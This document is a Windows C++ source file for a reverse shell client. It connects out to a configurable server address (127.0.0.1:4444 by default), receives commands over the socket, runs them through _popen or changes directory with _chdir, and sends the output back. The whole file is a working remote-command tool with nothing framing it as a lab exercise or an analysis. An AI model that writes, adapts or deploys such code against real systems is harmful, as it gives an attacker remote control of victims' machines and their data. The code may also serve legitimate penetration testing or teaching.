#define _WIN32_WINNT 0x0601 // make visible getaddrinfo function

#include <iostream>
#include <array>
#include <direct.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

// You can change as you want
#define SERVER_IP "127.0.0.1"
#define SERVER_PORT "4444"
#define BUFFER_SIZE 512

void init_windows_socket()
{
    WSADATA wsa_data;

    int i_result = WSAStartup(MAKEWORD(2, 2), &wsa_data);

    if (i_result != 0)
    {
        std::cerr << "WSAStartup could be started properly !!\n";
        exit(1);
    }
}

SOCKET create_client_socket()
{
    struct addrinfo* result = nullptr;
    struct addrinfo hints{0};

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    int i_result = getaddrinfo(SERVER_IP, SERVER_PORT, &hints, &result);

    if (i_result != 0)
    {
        std::cerr << "getaddrinfo failed: " << i_result << std::endl;
        exit(1);
    }

    SOCKET client_socket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);

    if (client_socket == INVALID_SOCKET)
    {
        std::cerr << "Socket creation was failed !!\n";
        exit(1);
    }

    int connection_result = connect(client_socket, result->ai_addr, (int)result->ai_addrlen);

    if (connection_result == SOCKET_ERROR)
    {
        std::cerr << "Connection failed !!\n";
        exit(1);
    }


    return client_socket;
}

std::string execute_command(const std::string &command)
{
    std::array<char, 128> buffer{};
    std::string result;

    FILE *pipe = _popen(command.c_str(), "r");

    if (!pipe) return "Command execution failed !!\n";

    while (fgets(buffer.data(), buffer.size(), pipe) != nullptr)
    {
        result += buffer.data();
    }

    _pclose(pipe);

    return result;
}

void handle_server_commands(SOCKET client_socket)
{
    std::string command{};
    while (command != "exit")
    {
        char buffer[1024];

        int i_result = recv(client_socket, buffer, sizeof(buffer)-1, 0);

        if (i_result > 0)
        {
            buffer[i_result] = '\0';

            command = buffer;
            std::string message;

            if (command.rfind("cd", 0) == 0)
            {
                std::string new_directory = command.substr(3);
                if (_chdir(new_directory.c_str()) == 0)
                {
                    char current_directory[1024];

                    if (_getcwd(current_directory, sizeof(current_directory)))
                    {
                        message = "Directory is changed to : " + std::string(current_directory) + "\n";
                        send(client_socket, message.c_str(), message.length(), 0);
                    }
                    else
                    {
                        message = "Directory is changed but failed to retrieve new directory.\n";
                        send(client_socket, message.c_str(), message.length(), 0);
                    }
                }
                else
                {
                    message = "Failed to change directory.\n";
                    send(client_socket, message.c_str(), message.length(), 0);
                }
            }
            else
            {
                std::string result = execute_command(command);
                send(client_socket, result.c_str(), result.length(), 0);
            }
        }
        else if (i_result == 0)
        {
            std::cout << "Connection closed !!\n";
            break;
        }
        else
        {
            std::cerr << "Recv failed !!\n";
        }
    }

}

int main()
{
    init_windows_socket();

    SOCKET client_socket = create_client_socket();
    std::cout << "Socket is created succesfuclly!!\n";

    handle_server_commands(client_socket);

    return 0;
}